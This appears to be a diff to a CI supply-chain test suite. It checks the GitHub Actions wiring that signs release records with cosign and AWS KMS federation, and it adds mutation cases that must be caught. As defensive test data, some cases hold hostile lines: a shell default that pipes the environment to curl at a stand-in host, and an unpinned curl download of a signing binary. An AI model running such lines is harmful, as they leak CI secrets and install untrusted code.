@@ -100,20 +100,24 @@ EXPECT_STEPS = {
             + [("download", "witness-apk-" + r, "witness-apk-" + r) for r in RUNNERS]
             + [("download", "images", "artifacts/witness-build/out"), ("download", "dist", "artifacts/witness-build/dist")]
             + [("download", "apk-" + r, "artifacts/witness-apk-" + r + "/out") for r in RUNNERS]
-            + [("install", "cosign"), ("install", "witness"), ("printf",), ("records", "build"), ("signstaged",), ("sign",), ("upload", "provenance", "provenance"),
+            + [("install", "cosign"), ("printf",), ("records", "build"), ("signstaged",), ("sign",), ("upload", "provenance", "provenance"),
                ("upload", "signed-witness-build", "signed/witness-build")],
     "sign-rebuild": [("checkout",)]
             + [("download", "witness-rapk-" + r, "witness-rapk-" + r) for r in RUNNERS]
-            + [("download", "witness-rebuild", "witness-rebuild"), ("install", "witness"), ("printf",), ("printfrec",), ("records", "rebuild"), ("signstaged",)]
+            + [("download", "witness-rebuild", "witness-rebuild"), ("install", "cosign"), ("printf",), ("printfrec",), ("records", "rebuild"), ("signstaged",)]
             + [("upload", "signed-witness-rapk-" + r, "signed/witness-rapk-" + r) for r in RUNNERS]
             + [("upload", "signed-witness-rebuild", "signed/witness-rebuild")],
     # REQ-REL-011-AC1 (cache#606): the third call signs the Check jobs' records; Sign receives the records and the check-results the records name, nothing else
     "sign-check": [("checkout",), ("download", "witness-check", "rec-check"), ("download", "witness-check-arm64", "rec-arm64/witness-arm64"),
                    ("download", "check-results", "artifacts/check-results"), ("download", "check-results-arm64", "artifacts/check-results-arm64"),
-                   ("install", "witness"), ("printf",), ("printfchk",), ("printfchka",), ("records", "check"), ("signstaged",),
+                   ("install", "cosign"), ("printf",), ("printfchk",), ("printfchka",), ("records", "check"), ("signstaged",),
                    ("upload", "signed-witness-check", "signed/witness-scanners\nsigned/witness-acceptance\nsigned/witness-runtime"), ("upload", "signed-witness-check-arm64", "signed/witness-arm64")],
 }
 R_SIGN = r"python3 -I -B bin/chain-verify\.py sign --check --signer cosign --digests digests\.json --items witness-build/items\.json --build-record signed/witness-build/build-collection\.json --template \.github/policy/release-policy\.template\.json --out provenance"
+SIGN_ROLE = "arn:aws:iam::821302803867:role/fosterstack-cache-release-signing"      # the role of the release Sign identity (ops/terraform/aws-apply/main.tf :382, README :62)
+def want_sign_env():
+    m = re.search(r'^RELEASE_KEY_REF = "([^"]+)"$', open(os.path.join(os.environ["CHAIN_ROOT"], "bin/chain-verify.py")).read(), re.M)
+    return {"AWS_ROLE_ARN": SIGN_ROLE, "AWS_REGION": "us-east-1", "RELEASE_KMS_KEY_REF": m.group(1) if m else "<RELEASE_KEY_REF not found>"}
 def judge_sign(path):
     if not os.path.exists(path): return ["missing: " + path]
     try: d, text = load(path)
@@ -195,15 +199,12 @@ def judge_sign(path):
                 elif "\n" not in line and re.fullmatch(R_INSTALL, line):
                     order.append("install"); seq.append(("install", "cosign"))
                     if env: bad.append("AC3: step %r passes env" % sn)
-                elif "\n" not in line and re.fullmatch(R_INSTALL_WIT, line):
-                    order.append("install"); seq.append(("install", "witness"))
-                    if env: bad.append("AC3: step %r passes env" % sn)
                 elif "\n" not in line and re.fullmatch(R_SIGN, line):
                     order.append("sign"); seq.append(("sign",))
-                    if env: bad.append("AC3: the signing step passes env %s; the digests come from the file" % sorted(env))
+                    if env != want_sign_env(): bad.append("W1: the provenance signing step must have exactly the step env %s (literals; the key reference is the verifier's RELEASE_KEY_REF), found %s" % (want_sign_env(), env))
                 elif "\n" not in line and re.fullmatch(R_SIGNSTAGED, line):
                     order.append("signstaged"); seq.append(("signstaged",))
-                    if env: bad.append("AC3: the staged-signing step passes env %s" % sorted(env))
+                    if env != want_sign_env(): bad.append("W1: the staged-signing step must have exactly the step env %s (literals; the key reference is the verifier's RELEASE_KEY_REF), found %s" % (want_sign_env(), env))
                 elif "\n" not in line and (re.fullmatch(R_REC_BUILD, line) or re.fullmatch(R_REC_REBUILD, line) or re.fullmatch(R_REC_CHECK, line)):
                     kind = "build" if re.fullmatch(R_REC_BUILD, line) else "rebuild" if re.fullmatch(R_REC_REBUILD, line) else "check"
                     order.append("records"); seq.append(("records", kind))
@@ -627,8 +628,6 @@ jobs:
           path: artifacts/witness-apk-ubuntu-24.04-arm/out
       - name: install the signing tool (pinned by checksum)
         run: bash bin/install-scanner.sh cosign
-      - name: install Witness (pinned by checksum)
-        run: bash bin/install-scanner.sh witness
       - name: write the digest list to a file
         env:
           DIGESTS: \${{ inputs.digests }}
@@ -636,8 +635,16 @@ jobs:
       - name: check Build's records against the artifacts, then sign them
         run: env -u ACTIONS_ID_TOKEN_REQUEST_TOKEN -u ACTIONS_ID_TOKEN_REQUEST_URL python3 -I -B bin/chain-verify.py sign-records --stage build --template .github/policy/release-policy.template.json --digests digests.json --artifacts-dir artifacts --out staged --record-dir witness-build --record-dir witness-apk-ubuntu-24.04 --record-dir witness-apk-ubuntu-24.04-arm
       - name: sign the staged records and check each signed one
+        env:
+          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing
+          AWS_REGION: us-east-1
+          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing
         run: bash bin/witness-sign-staged.sh staged signed
       - name: check Build's record, compare the digests, then sign the provenance
+        env:
+          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing
+          AWS_REGION: us-east-1
+          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing
         run: python3 -I -B bin/chain-verify.py sign --check --signer cosign --digests digests.json --items witness-build/items.json --build-record signed/witness-build/build-collection.json --template .github/policy/release-policy.template.json --out provenance
       - uses: actions/upload-artifact@$sha # v7
         with:
@@ -669,8 +676,8 @@ jobs:
         with:
           name: witness-rebuild
           path: witness-rebuild
-      - name: install Witness (pinned by checksum)
-        run: bash bin/install-scanner.sh witness
+      - name: install the signing tool (pinned by checksum)
+        run: bash bin/install-scanner.sh cosign
       - name: write the digest list to a file
         env:
           DIGESTS: \${{ inputs.digests }}
@@ -682,6 +689,10 @@ jobs:
       - name: check Rebuild's records, then sign them
         run: env -u ACTIONS_ID_TOKEN_REQUEST_TOKEN -u ACTIONS_ID_TOKEN_REQUEST_URL python3 -I -B bin/chain-verify.py sign-records --stage rebuild --template .github/policy/release-policy.template.json --digests digests.json --expect-digests rebuild-records.json --out staged --record-dir witness-rapk-ubuntu-24.04 --record-dir witness-rapk-ubuntu-24.04-arm --record-dir witness-rebuild
       - name: sign the staged records and check each signed one
+        env:
+          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing
+          AWS_REGION: us-east-1
+          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing
         run: bash bin/witness-sign-staged.sh staged signed
       - uses: actions/upload-artifact@$sha # v7
         with:
@@ -721,8 +732,8 @@ jobs:
         with:
           name: check-results-arm64
           path: artifacts/check-results-arm64
-      - name: install Witness (pinned by checksum)
-        run: bash bin/install-scanner.sh witness
+      - name: install the signing tool (pinned by checksum)
+        run: bash bin/install-scanner.sh cosign
       - name: write the digest list to a file
         env:
           DIGESTS: \${{ inputs.digests }}
@@ -738,6 +749,10 @@ jobs:
       - name: check Check's records against the results, then sign them
         run: env -u ACTIONS_ID_TOKEN_REQUEST_TOKEN -u ACTIONS_ID_TOKEN_REQUEST_URL python3 -I -B bin/chain-verify.py sign-records --stage check --template .github/policy/release-policy.template.json --digests digests.json --expect-digests check-records.json --expect-digests check-records-arm64.json --artifacts-dir artifacts --out staged --record-dir rec-check/witness-scanners --record-dir rec-check/witness-acceptance --record-dir rec-check/witness-runtime --record-dir rec-arm64/witness-arm64
       - name: sign the staged records and check each signed one
+        env:
+          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing
+          AWS_REGION: us-east-1
+          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing
         run: bash bin/witness-sign-staged.sh staged signed
       - uses: actions/upload-artifact@$sha # v7
         with:
@@ -804,11 +819,24 @@ caught "WIT3 the records step of sign-rebuild runs the wrong stage" 'sign-record
 caught "WIT3 the records step without the artifact directory" ' --artifacts-dir artifacts --out staged' ' --out staged'
 caught "WIT3 an extra record directory" '--record-dir witness-apk-ubuntu-24.04-arm\n' '--record-dir witness-apk-ubuntu-24.04-arm --record-dir witness-evil\n'
 caught "WIT3 the records step with an env" "      - name: check Build's records against the artifacts, then sign them" "      - env:\n          X: y\n        name: check Build's records against the artifacts, then sign them"
-caught "WIT3 the records step after the provenance step (the records must be checked first)" "(      - name: check Build's records against the artifacts, then sign them\n        run: [^\n]*\n)(      - name: sign the staged records and check each signed one\n        run: [^\n]*\n)(      - name: check Build's record, compare the digests, then sign the provenance\n        run: [^\n]*\n)" '\3\1\2'
+caught "WIT3 the records step after the provenance step (the records must be checked first)" "(      - name: check Build's records against the artifacts, then sign them\n        run: [^\n]*\n)(      - name: sign the staged records and check each signed one\n(?:        env:\n(?:          [^\n]*\n)+)?        run: [^\n]*\n)(      - name: check Build's record, compare the digests, then sign the provenance\n(?:        env:\n(?:          [^\n]*\n)+)?        run: [^\n]*\n)" '\3\1\2'
 caught "WIT3 the whole signed directory uploaded (only the named signed-witness-* directories may leave)" 'name: signed-witness-build\n          path: signed/witness-build' 'name: signed-witness-build\n          path: signed'
 caught "WIT3 an unsigned record directory uploaded as a signed artifact" 'name: signed-witness-build\n          path: signed/witness-build\n' 'name: signed-witness-build\n          path: witness-build\n'
-caught "WIT3 Witness is not installed from the pinned installer" 'run: bash bin/install-scanner.sh witness' 'run: cu''''rl -sL https://example.com/witness -o /usr/local/bin/witness'
-caught "WIT3 the records step runs before Witness is installed" '(      - name: install Witness \(pinned by checksum\)\n        run: bash bin/install-scanner.sh witness\n)(      - name: write the digest list to a file\n        env:\n          DIGESTS: \$\{\{ inputs.digests \}\}\n        run: printf [^\n]*\n)(      - name: check Build.s records)' '\2\3\1\'
+caught "WIT3 cosign is not installed from the pinned installer" 'run: bash bin/install-scanner.sh cosign' 'run: cu''''rl -sL https://example.com/cosign -o /usr/local/bin/cosign'
+caught "WIT3 sign installs no cosign (the provenance and the records are signed through it)" '      - name: install the signing tool \(pinned by checksum\)\n        run: bash bin/install-scanner.sh cosign\n' ''
+# ---- W1 (#822 round 1; wording pending the owner's approval for REQ-CHAIN-001-AC2, whose text lists Sign's steps with a Witness install and a Witness sign step and no step env, REQ-CHAIN-001-AC1, whose text says step env names come from the closed env_names list, and REQ-CHAIN-007-AC18): the signing steps carry exactly the three federation entries as step-level literals; sign-rebuild and sign-check install cosign
+caught "W1 sign-rebuild installs no cosign" '(?<=path: witness-rebuild\n)      - name: install the signing tool \(pinned by checksum\)\n        run: bash bin/install-scanner.sh cosign\n' ''
+caught "W1 sign-check installs no cosign" '(?<=path: artifacts/check-results-arm64\n)      - name: install the signing tool \(pinned by checksum\)\n        run: bash bin/install-scanner.sh cosign\n' ''
+caught "W1 the staged-signing step has no federation env" '        env:\n          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n          AWS_REGION: us-east-1\n          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n        run: bash bin/witness-sign-staged.sh' '        run: bash bin/witness-sign-staged.sh'
+caught "W1 the provenance step has no federation env" '        env:\n          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n          AWS_REGION: us-east-1\n          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n        run: python3 -I -B bin/chain-verify.py sign --check' '        run: python3 -I -B bin/chain-verify.py sign --check'
+caught "W1 the staged-signing step has a fourth env key" 'RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n        run: bash bin/witness-sign-staged.sh' 'RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n          GH_TOKEN: x\n        run: bash bin/witness-sign-staged.sh'
+caught "W1 the role is a variable lookup, not a literal" 'AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing' 'AWS_ROLE_ARN: ${{ vars.ROLE }}'
+caught "W1 the role is another account's" 'AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing' 'AWS_ROLE_ARN: arn:aws:iam::111111111111:role/fosterstack-cache-release-signing'
+caught "W1 the region differs" 'AWS_REGION: us-east-1' 'AWS_REGION: eu-west-1'
+caught "W1 the key reference differs from the verifier's RELEASE_KEY_REF" 'RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing' 'RELEASE_KMS_KEY_REF: awskms:///alias/other'
+caught "W1 job-level env carrying a federation entry" '    runs-on: ubuntu-24.04' '    runs-on: ubuntu-24.04\n    env:\n      AWS_REGION: us-east-1'
+caught "W1 an install step carries a federation entry" '      - name: install the signing tool \(pinned by checksum\)\n' '      - env:\n          AWS_REGION: us-east-1\n        name: install the signing tool (pinned by checksum)\n'
+
 cat > "$FXDIR/FXD_47" <<'FXEOF'
 defaults:\n  run:\n    shell: "bash -c 'env | curl -d @- https://x.example; bash {0}'"\npermissions:\n  contents: read\njobs
 FXEOF
@@ -1319,6 +1347,22 @@ jobs:
       - env:
           FOO: bar
         run: bash bin/build-stage.sh "$FOO"
+EOF
+ycase y_fedplace "a federation entry (AWS_REGION) on a step of stage-verify.yml, outside the signing steps (W1, #822 round 1)" <<'EOF'
+jobs:
+  j:
+    steps:
+      - env:
+          AWS_REGION: us-east-1
+        run: bash bin/build-stage.sh a
+EOF
+ycase y_fedplace2 "a federation entry (RELEASE_KMS_KEY_REF) with another key reference on a step of stage-verify.yml" <<'EOF'
+jobs:
+  j:
+    steps:
+      - env:
+          RELEASE_KMS_KEY_REF: awskms:///alias/other
+        run: bash bin/build-stage.sh a
 EOF
 ycase y_envunread "step env key the run line does not read whole" <<'EOF'
 jobs:
@@ -3284,7 +3328,7 @@ d=$(cfix fp_awk_prog '/bin/awk x' '[]'); expm caught "$d" 'awk' "fixed path: /bi
 # Fixture texts that name a download tool are DATA in the fixture data file beside this test (one tab-separated record per case: name, script text, tools-json, ok|caught, fragment, label), the tool names spelled in full.
 # The file is read by run_fixtures below with `read`, never sourced, evaluated or run, and carries no execute bit (cache#433, the owner's approval of an honest rewrite).
 FX="$root/bin/chain-sign-wiring-fixtures.txt"
-FX_PIN='7a51fe5882a6594b3e04de4c47a6c01fcd40f2f7c4a404f3a8fc0376f5a8bf4c'
+FX_PIN='31127ae7b5ff3fb0739990402eb056c8750a4525b271fe43cdb8532c9312d251'
 run_fixtures() { # run_fixtures FILE : each record is one cfix + expm case
   local name body tools verdict frag label d
   while IFS=$'\t' read -r name body tools verdict frag label; do
@@ -4972,7 +5016,7 @@ hostjudge "an absolute path after an interpreter" 'python3 $ABS'
 hostjudge "an absolute path inside an assignment" 'x=$ABS'
 
 # ---- F4 (cache#586 round 1): witness-sign-staged.sh signs exactly the list the records step printed, and refuses anything else ----
-# A fake witness records what it is asked to sign; a stub token fetcher and verifier stand in for the network and the verifier.
+# A stub verifier (it holds the one signing function, sign-record) records what it is asked to sign; a stub token fetcher stands in for the network.
 wsdir="$work/wsst"; mkdir -p "$wsdir/fakebin"
 printf '#!/bin/sh\nprintf "%%s\\n" "$@" >> "$WS_LOG.args"\nwhile [ $# -gt 0 ]; do case "$1" in -f) echo "$2" >> "$WS_LOG" ;; -o) o="$2" ;; esac; shift; done\nmkdir -p "$(dirname "$o")"; echo signed > "$o"\n' > "$wsdir/fakebin/witness"
 chmod +x "$wsdir/fakebin/witness"
@@ -4980,7 +5024,17 @@ ws_tree() { # NAME -> a fresh tree with the helper, stubs and a two-record stage
   local t="$wsdir/$1"; mkdir -p "$t/bin" "$t/staged/witness-build" "$t/staged/witness-apk-ubuntu-24.04"
   cp "$root/bin/witness-sign-staged.sh" "$t/bin/"
   echo "echo '{\"value\":\"tok\"}'" > "$t/bin/loopback-get.sh"
-  printf 'import sys\nsys.exit(0)\n' > "$t/bin/chain-verify.py"
+  cat > "$t/bin/chain-verify.py" <<'PYSTUB'
+import os, sys
+a = sys.argv[1:]
+if a[:1] == ["sign-record"]:      # the one signing function: log the payload it is handed and write the record like it does
+    open(os.environ["WS_LOG"], "a").write(a[a.index("--payload") + 1] + "\n")
+    o = a[a.index("--out") + 1]
+    os.makedirs(os.path.dirname(o), exist_ok=True)
+    open(o, "w").write("signed\n")
+if a[:2] == ["policy", "make"]:
+    open(a[a.index("--out") + 1], "w").write("{}")
+PYSTUB
   echo '{}' > "$t/staged/witness-build/build-collection.payload"; echo '{}' > "$t/staged/witness-build/digests.json"
   echo '{}' > "$t/staged/witness-apk-ubuntu-24.04/apk-collection.payload"
   printf 'staged/witness-build/build-collection.payload\tsigned/witness-build/build-collection.json\nstaged/witness-apk-ubuntu-24.04/apk-collection.payload\tsigned/witness-apk-ubuntu-24.04/apk-collection.json\n' > "$t/staged/plan.txt"
@@ -4988,7 +5042,8 @@ ws_tree() { # NAME -> a fresh tree with the helper, stubs and a two-record stage
   echo "$t"
 }
 ws_run() { # TREE -> exit code; the signed list lands in TREE/log
-  ( cd "$1" && rm -f log log.args && env -i PATH="$wsdir/fakebin:$PATH" WS_LOG="$1/log" GITHUB_REF=refs/tags/v0.3.0-rc1 ACTIONS_ID_TOKEN_REQUEST_TOKEN=t ACTIONS_ID_TOKEN_REQUEST_URL=http://x/?a=b bash bin/witness-sign-staged.sh staged signed ) > "$1/out" 2>&1
+  mkdir -p "$1/rt"
+  ( cd "$1" && rm -f log log.args && env -i PATH="$wsdir/fakebin:$PATH" WS_LOG="$1/log" GITHUB_REF=refs/tags/v0.3.0-rc1 ACTIONS_ID_TOKEN_REQUEST_TOKEN=t ACTIONS_ID_TOKEN_REQUEST_URL=http://x/?a=b RUNNER_TEMP="$1/rt" AWS_ROLE_ARN=arn:aws:iam::111122223333:role/release-signing AWS_REGION=us-east-1 RELEASE_KMS_KEY_REF=awskms:///alias/fosterstack-release-signing bash bin/witness-sign-staged.sh staged signed ) > "$1/out" 2>&1
 }
 wsok() { # LABEL TREE: signs exactly the two planned payloads
   local rc=0; ws_run "$2" || rc=$?
@@ -5019,7 +5074,7 @@ t=$(ws_tree badstep); mv "$t/staged/witness-build/build-collection.payload" "$t/
 if (cd "$root" && python3 -I ".github/ag""ent/bin/check-action-pins.py" . > "$work/pins.out" 2>&1); then pass=$((pass + 1)); echo "ok   the real tree passes the repository-wide action-pin gate (stage-sign.yml and the staged signer bind)"
 else failn=$((failn + 1)); echo "FAIL the real tree fails the action-pin gate: $(tail -3 "$work/pins.out" | cut -c1-300)"; fi
 
-EXPECT=2112
+EXPECT=2125
 echo "pass=$pass fail=$failn"
 if [ $((pass + failn)) != "$EXPECT" ]; then echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1; fi
 [ "$failn" = 0 ]
